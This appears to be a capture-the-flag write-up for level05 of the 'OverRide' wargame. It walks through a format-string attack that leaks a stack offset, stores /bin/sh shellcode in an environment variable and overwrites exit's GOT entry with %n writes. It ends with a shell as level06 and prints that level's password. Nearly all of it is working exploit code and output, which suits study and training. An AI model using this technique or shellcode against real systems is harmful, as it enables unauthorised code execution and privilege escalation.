# level 05

## get_binary

```shell
scp -P 4242 level05@192.168.0.0:/home/users/level05/level05 level05.bin
```

## Exploit

### printf

```shell
level05@OverRide:~$ ./level05 
BBBB %10$p        
bbbb 0x62626262
```

### shellcode

* shellcode (https://www.exploit-db.com/exploits/42428) : `\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`

```shell
export SHELLCODE=$(echo -ne "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")
#Address of shellcode : `0xffffd8aa`
```

```shell
ffffd8aa_16 = 4294957226_10 > INT_MAX
# Split
0xd8aa --> 55466 --> 55458 + 8
0xffff --> 65535 --> 10069 + 55458 + 8
```

### Overwrite exit

```shell
#08048370 <exit@plt>:
# 8048370:       ff 25 e0 97 04 08       jmp    DWORD PTR ds:0x80497e0
# 8048376:       68 18 00 00 00          push   0x18
# 804837b:       e9 b0 ff ff ff          jmp    8048330 <_init+0x38>

0x80497e0                   --> \xe0\x97\x04\x08
0x80497e0 + 2 = 0x80497e2   --> \xe2\x97\x04\x08

(gdb) x/xw 0x80497e0
0x80497e0 <exit@got.plt>:       0x08048376
(gdb) x/xw 0x80497e2
0x80497e2 <exit@got.plt+2>:     0x54200804

python2.7 -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55458x" + "%10$n" + "%10069x" + "%11$n")' > /tmp/exploit.txt
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
